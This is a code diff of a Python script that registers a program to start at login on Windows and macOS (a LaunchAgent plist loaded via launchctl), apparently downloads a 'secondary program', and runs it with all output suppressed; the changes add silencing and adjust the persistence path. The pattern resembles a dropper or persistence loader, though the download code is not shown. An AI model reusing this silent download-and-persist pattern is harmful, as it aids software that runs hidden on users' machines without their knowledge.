@@ -85,6 +85,7 @@ def add_to_startup_windows(program_path):
     print(f"Shortcut created at {shortcut_path}")
 
 def add_to_startup_mac(program_path):
+    print(program_path)
     plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
     <plist version="1.0">
@@ -93,13 +94,12 @@ def add_to_startup_mac(program_path):
         <string>secondary_programxv</string>
         <key>ProgramArguments</key>
         <array>
-      
-            <string>{program_path}</string>
+
+            <string>{program_path}/Contents/MacOS/{PROGRAM_NAME}</string>
         </array>
         <key>RunAtLoad</key>
         <true/>
-        <key>KeepAlive</key>
-        <true/>
+   
     </dict>
     </plist>"""
 
@@ -108,7 +108,11 @@ def add_to_startup_mac(program_path):
         plist_file.write(plist_content)
 
     # Load the plist file
-    subprocess.run(['launchctl', 'load', plist_path])
+    subprocess.run(['launchctl', 'unload', plist_path],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.run(['launchctl', 'load', plist_path],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    # subprocess.run(['launchctl', 'start', plist_path])
+    # launchctl start com.yourdomain.yourapp
+
     print(f"LaunchAgent created at {plist_path}")
 
 def download_secondary_program():
@@ -133,9 +137,9 @@ def download_secondary_program():
 def run_secondary_program(path):
     try:
         if platform.system() == "Windows":
-            subprocess.Popen([path])
+            subprocess.Popen([path],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         elif platform.system() == "Darwin":  # macOS
-            subprocess.Popen(["open", path])
+            subprocess.Popen(["open", path],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         print(f"Running: {path}")
     except Exception as e:
         print(f"Failed to run {path}: {e}")
